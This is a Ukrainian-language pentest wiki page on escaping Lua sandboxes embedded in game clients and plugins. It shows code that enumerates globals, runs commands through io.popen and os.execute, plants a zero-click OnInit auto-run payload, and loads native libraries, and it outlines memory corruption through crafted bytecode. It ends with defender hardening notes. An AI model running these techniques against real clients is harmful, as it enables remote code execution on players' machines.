# Обхід Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Ця сторінка збирає практичні прийоми для переліку та виходу з Lua "sandboxes", вбудованих в додатки (зокрема game clients, plugins або in-app scripting engines). Багато рушіїв надають обмежене середовище Lua, але залишають доступними потужні globals, які дозволяють виконувати довільні команди або навіть спричиняти корупцію нативної пам'яті, коли доступні bytecode loaders.

Ключові ідеї:
- Розглядайте VM як невідоме середовище: перелічуйте _G і знаходьте, які небезпечні примітиви доступні.
- Якщо stdout/print заблоковано, використовуйте будь-який in-VM UI/IPC канал як вихідний sink, щоб спостерігати результати.
- Якщо io/os доступні, часто є пряме виконання команд (io.popen, os.execute).
- Якщо load/loadstring/loadfile доступні, виконання створеного Lua bytecode може підірвати безпеку пам'яті в деяких версіях (верифайери ≤5.1 можна обійти; у 5.2 верифайер видалено), що відкриває можливості для просунутої експлуатації.

## Enumerate the sandboxed environment

- Здампте глобальне середовище, щоб інвентаризувати доступні таблиці/функції:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Якщо print() недоступний, перепрофілюйте in-VM канали. Приклад з MMO housing script VM, де вивід у чат працює лише після виклику звуку; наведене нижче створює надійну функцію виводу:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Узагальніть цей патерн для вашої цілі: будь-яке текстове поле, toast, logger або UI callback, яке приймає рядки, може слугувати stdout для розвідки.

## Пряме виконання команд, якщо io/os доступні

Якщо пісочниця досі надає доступ до стандартних бібліотек io або os, ймовірно, у вас є негайне виконання команд:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notes:
- Виконання відбувається в межах client process; багато шарів anti-cheat/antidebug, що блокують external debuggers, не завадять in-VM process creation.
- Також перевірте: package.loadlib (довільне завантаження DLL/.so), require з native modules, LuaJIT's ffi (якщо присутній), та debug library (може підвищувати привілеї всередині VM).

## Zero-click triggers via auto-run callbacks

Якщо host application штовхає скрипти на clients і VM надає auto-run hooks (e.g., OnInit/OnLoad/OnEnter), розмістіть свій payload там для drive-by compromise одразу після завантаження скрипта:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Будь-який еквівалентний callback (OnLoad, OnEnter тощо) узагальнює цю техніку, коли скрипти передаються й автоматично виконуються на клієнті.

## Небезпечні примітиви для пошуку під час recon

Під час перебору _G звертайте особливу увагу на:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: виконують вихідний код або байткод; підтримують завантаження ненадійного байткоду.
- package, package.loadlib, require: динамічне завантаження бібліотек та API модуля.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, та hooks.
- LuaJIT-only: ffi.cdef, ffi.load для прямого виклику нативного коду.

Мінімальні приклади використання (якщо досяжні):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Опціональна ескалація: зловживання Lua bytecode loaders

Коли load/loadstring/loadfile доступні, але io/os обмежені, виконання сконструйованого Lua bytecode може призвести до memory disclosure та corruption primitives. Ключові факти:
- Lua ≤ 5.1 постачався з bytecode verifier, для якого відомі обходи.
- Lua 5.2 повністю видалив verifier (офіційна позиція: applications should just reject precompiled chunks), що розширює attack surface, якщо bytecode loading не заборонено.
- Типові workflow: leak pointers via in-VM output, craft bytecode to create type confusions (e.g., around FORLOOP or other opcodes), потім pivot до arbitrary read/write або native code execution.

Цей шлях залежить від engine/version і вимагає RE. Див. References для детальних розборів, exploitation primitives та прикладів gadgetry в іграх.

## Detection and hardening notes (for defenders)

- На стороні сервера: reject or rewrite user scripts; allowlist safe APIs; strip or bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- На стороні клієнта: запускати Lua з мінімальним _ENV, заборонити bytecode loading, повторно ввести строгий bytecode verifier або перевірку підписів, і блокувати створення процесів з процесу клієнта.
- Телеметрія: оповіщення при gameclient → child process creation незабаром після завантаження скрипту; корелювати з UI/chat/script events.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
